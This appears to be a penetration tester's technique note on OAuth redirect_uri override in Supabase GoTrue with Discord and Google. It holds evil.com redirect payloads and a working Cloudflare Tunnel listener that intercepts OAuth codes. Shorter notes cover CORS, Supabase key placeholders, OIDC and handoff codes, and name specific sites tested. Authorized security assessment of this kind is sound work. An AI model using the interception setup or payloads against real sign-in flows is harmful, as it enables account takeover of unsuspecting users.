# Technique: OAuth redirect_uri override — provider-side impact gate + Cloudflare Tunnel callback catcher

## The GoTrue flaw (config-level, real but often unexploitable)

GoTrue (`/auth/v1/authorize?provider=X&redirect_uri=ATTACKER`) forwards ANY client-supplied `redirect_uri` verbatim to the OAuth provider. Variants all pass through:
- `https://evil.com/cb`
- `http://evil.com/cb` (no HTTPS enforcement)
- `/callback/../../evil` (path traversal, no normalization)
- `evil.com@legithost/cb` (userinfo confusion)

`redirect_to` is a DIFFERENT benign param — it passes as a dead provider query param (false-positive discriminator).

**The impact gate is provider-side, not GoTrue-side.** GoTrue being vulnerable is necessary but NOT sufficient. Rate the GoTrue-side flaw ~8.1 as a config finding; the kill-chain only fires if the provider also accepts the URI.

## Provider discriminator matrix

| Provider | Render-time validation | Token-exchange validation | Impact |
|----------|----------------------|--------------------------|--------|
| **Google** | Hard-rejects unregistered URIs at render (`redirect_uri_mismatch` error page) | N/A | **Chain blocked at render** — safe even with GoTrue flaw |
| **Discord** | Renders authorize page 200 regardless (validates at token-exchange, not render) | Rejects unregistered URIs at token-exchange | **Impact gate = Discord app's registered redirect URIs** |

Discord's 200 on the authorize page is NOT proof of acceptance. The only way to know is to complete the flow and see whether Discord delivers the code to your URI or shows "Invalid OAuth".

## Live test: Cloudflare Tunnel callback catcher

The decisive test requires capturing the OAuth redirect. If the operator owns the target and will click the link:

```bash
# 1. Stand up a tiny HTTP listener that logs ?code=
cat > /tmp/oauth_cb_listener.py <<'EOF'
import http.server, urllib.parse, sys, datetime
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(p.query)
        print(f"[{datetime.datetime.now(datetime.UTC).isoformat()}] GET {self.path}", flush=True)
        if 'code' in params:
            print(f"\n*** OAUTH CODE INTERCEPTED ***\n", flush=True)
        self.send_response(200); self.end_headers()
        self.wfile.write(b"callback captured")
    def log_message(self, *a): pass
http.server.HTTPServer(("0.0.0.0", 8888), H).serve_forever()
EOF
python3 /tmp/oauth_cb_listener.py 8888 &

# 2. Tunnel it (cloudflared is usually preinstalled)
cloudflared tunnel --url http://localhost:8888 --no-autoupdate 2>&1 | tee /tmp/cf.log &
sleep 4
TUNNEL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf.log | head -1)

# 3. Confirm GoTrue forwards YOUR tunnel URI
curl -s -o /dev/null -w "%{redirect_url}\n" \
  "https://auth.TARGET/auth/v1/authorize?provider=discord&redirect_uri=${TUNNEL}/cb"

# 4. Hand the operator the Discord authorize URL (the 302 Location from step 3)
#    They open it logged-in, click Authorize. Outcomes:
#    - Listener sees ?code= → CONFIRMED redirect_uri override works end-to-end
#    - Discord shows "Invalid OAuth" / redirect_uri_mismatch → provider rejects, chain blocked
```

Outcome interpretation:
- **Discord "Invalid OAuth" after authorize click** = Discord app has strict registered-URI validation. The GoTrue redirect_uri override is real but the chain dies at the provider. NOT a working account takeover.
- **Listener sees ?code=** = Discord app accepts the URI (loose/wildcard registration) → **CONFIRMED account takeover chain**.

Gotcha: the `state` param is bound to a GoTrue server-side session cookie the attacker doesn't have — so even a captured code may not be exchangeable without the victim's cookie. The code landing in your listener is itself the proof the override works; full takeover needs the state cookie too. Report as "redirect_uri delivery confirmed" and note the state-binding as the next gate.

## CORS arbitrary origin on Bearer-token APIs — config flaw, not direct exploit

`access-control-allow-origin: https://evil.com` reflected on an OpenAI-compatible API is **only CVSS 9.1 if the API uses cookie-based auth**. When the API uses `Authorization: Bearer <token>` and the SPA stores tokens in `sessionStorage` / `localStorage`:

- A malicious cross-origin site CAN make fetch requests with `credentials: 'include'`
- But the browser will NOT attach the Bearer header (that's set by JS, not the browser)
- And sessionStorage is origin-scoped — the malicious site cannot read the victim's token

**Score this LOW/MEDIUM config flaw, not critical.** It only becomes exploitable when chained with a separate token-leak primitive (XSS, postMessage leak, referrer leak). Don't false-positive it the way logfare.ai's cookie-auth CORS was a true 9.1.

Quick discriminator: check `Set-Cookie` on login / `WWW-Authenticate` header. If auth is Bearer-only and no session cookie is set, CORS reflection is informational.

## Supabase JS client — bundle ships truncated anon key placeholder

When the SPA uses `@supabase/supabase-js` with the pattern `createClient(url, anonKey)`, some builds ship the anon key as a **truncated placeholder** in the bundle:

```js
var Kr=`https://auth.TARGET`, qr=`eyJhbG...YuCQ`
//                                        ^^^ literal "..." — not the real key
```

The real key is injected at runtime from environment / a separate config fetch. Don't waste time trying to extract a full key from the bundle when you see `...` in the middle — verify by checking the byte length (real Supabase anon keys are ~169-220 chars; a truncated placeholder is visibly shorter). If the bundle has a placeholder, the key comes from elsewhere (build-time env, edge function, or a `/api/config` endpoint).

## First-party OIDC (separate from GoTrue external OAuth)

Platforms that offer "Login with X" via their own OIDC provider (`/oauth/authorize` + `/api/oauth/token`) are a SEPARATE auth surface from the Supabase GoTrue external OAuth (Discord/Google). On gratisfy.xyz the first-party flow used:

- PKCE S256 with `crypto.getRandomValues(48)` verifier — proper, not bruteable
- `code_challenge_method: S256`, nonce, sessionStorage state binding
- Server rejects garbage codes with uniform `invalid_grant`

Treat first-party OIDC as hardened unless the verifier is `Math.random()`-based or the challenge method is `plain`. Mine the SPA bundle for the PKCE generation function to confirm — `grep -oE 'crypto\.getRandomValues|Math\.random' firstPartyOidc*.js`.

## Handoff-code entropy — unbruteforceable to size blind

A one-time handoff code exchanged at `/api/auth/platform-handoff/exchange` (code → Supabase access+refresh tokens) is a juicy target, but you CANNOT size its entropy without observing one real code. Uniform `401 invalid_handoff_code` on garbage gives no format/length oracle. The `/start` endpoint requires a valid refresh_token to mint a code — pre-auth you can't generate one.

Log it as "brute surface open, entropy unknown" and move on. Sizing needs one authenticated session to trigger a real handoff and observe the code format in the redirect URL.
